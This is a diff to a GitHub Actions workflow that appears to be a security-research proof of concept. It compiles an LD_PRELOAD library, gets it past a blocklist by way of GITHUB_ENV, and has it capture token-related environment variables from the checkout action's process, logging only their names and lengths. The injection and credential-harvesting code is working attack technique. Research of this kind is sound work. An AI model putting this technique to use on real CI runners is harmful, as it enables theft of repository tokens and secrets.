@@ -6,34 +6,54 @@ permissions:
   contents: read
 
 jobs:
-  test-ldpreload:
+  capture-token:
     runs-on: ubuntu-latest
     steps:
-      - name: Step 1 — compile LD_PRELOAD .so and set env
+      - name: Step 1 — compile .so that captures INPUT_ vars and set LD_PRELOAD
         run: |
-          # Create a shared library that sets a marker env var when loaded
-          cat > /tmp/preload.c << 'CEOF'
+          cat > /tmp/capture.c << 'CEOF'
           #include <stdlib.h>
+          #include <stdio.h>
+          #include <string.h>
+          extern char **environ;
           __attribute__((constructor))
           void init(void) {
-              setenv("LD_PRELOAD_INJECTED", "SYSTEM_LEVEL_CODE_EXEC_PROVEN", 1);
+              FILE *f = fopen("/tmp/captured_env.txt", "a");
+              if (!f) return;
+              // Scan ALL env vars for token-like values
+              for (char **env = environ; *env; env++) {
+                  if (strstr(*env, "INPUT_") == *env ||
+                      strstr(*env, "GITHUB_TOKEN") == *env ||
+                      strstr(*env, "ACTIONS_RUNTIME") == *env) {
+                      // Write key name only (redact values for safety)
+                      char *eq = strchr(*env, '=');
+                      if (eq) {
+                          int keylen = eq - *env;
+                          int vallen = strlen(eq+1);
+                          fprintf(f, "%.*s=(%d chars)\n", keylen, *env, vallen);
+                      }
+                  }
+              }
+              fprintf(f, "---CONSTRUCTOR_RAN---\n");
+              fclose(f);
           }
           CEOF
-          gcc -shared -fPIC -o /tmp/preload.so /tmp/preload.c
-          ls -la /tmp/preload.so
-          
-          # Set LD_PRELOAD via GITHUB_ENV (bypasses blocklist)
-          echo "LD_PRELOAD=/tmp/preload.so" >> $GITHUB_ENV
-          echo "Step 1: Compiled .so and set LD_PRELOAD"
+          gcc -shared -fPIC -o /tmp/capture.so /tmp/capture.c
+          echo "LD_PRELOAD=/tmp/capture.so" >> $GITHUB_ENV
+          echo "Step 1: .so compiled and LD_PRELOAD set"
 
-      - name: Step 2 — check if LD_PRELOAD injected code
+      - name: Step 2 — checkout (Node.js action, gets INPUT_TOKEN)
+        uses: actions/checkout@v4
+
+      - name: Step 3 — check what the .so captured from checkout's process
         run: |
-          echo "=== LD_PRELOAD injection check ==="
-          echo "LD_PRELOAD=$LD_PRELOAD"
-          echo "LD_PRELOAD_INJECTED=$LD_PRELOAD_INJECTED"
-          
-          if [ "$LD_PRELOAD_INJECTED" = "SYSTEM_LEVEL_CODE_EXEC_PROVEN" ]; then
-            echo "CRITICAL: LD_PRELOAD code execution PROVEN — .so constructor ran!"
+          echo "=== Captured env vars from LD_PRELOAD constructor ==="
+          if [ -f /tmp/captured_env.txt ]; then
+            cat /tmp/captured_env.txt
+            echo ""
+            echo "Lines containing INPUT_TOKEN or GITHUB_TOKEN:"
+            grep -c "INPUT_TOKEN\|INPUT_GITHUB\|GITHUB_TOKEN" /tmp/captured_env.txt || echo "0"
+            grep "INPUT_TOKEN\|INPUT_GITHUB\|GITHUB_TOKEN" /tmp/captured_env.txt || echo "(none)"
           else
-            echo "LD_PRELOAD .so may not have loaded (check for errors above)"
+            echo "No capture file found"
           fi
